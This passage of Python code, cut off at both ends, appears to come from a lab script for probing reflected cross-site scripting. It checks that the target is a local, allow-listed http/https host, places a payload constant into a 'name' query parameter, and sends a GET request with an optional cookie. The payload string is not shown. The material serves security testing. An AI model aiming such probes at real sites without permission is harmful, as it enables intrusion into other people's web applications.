validate_target(url): parsed = urlparse(url) if parsed.scheme not in ("http", "https"): raise ValueError("仅允许 http/https: %r" % url) if (parsed.hostname or "").lower() not in ALLOWED_HOSTS: raise ValueError("仅允许本机目标: %r" % (parsed.hostname,)) def build_url(base, path): return base.rstrip("/") + path + "?" + urlencode({"name": PAYLOAD}) def fetch(url, cookie, timeout): headers = {"User-Agent": "llm-lab-xss002/1.0", "Accept": "text/html"} if cookie: headers["Cookie"] = cookie req = Request(url, headers=headers, method="GET") opener = build_opener(NoRedirect) try: with opener.open(req,
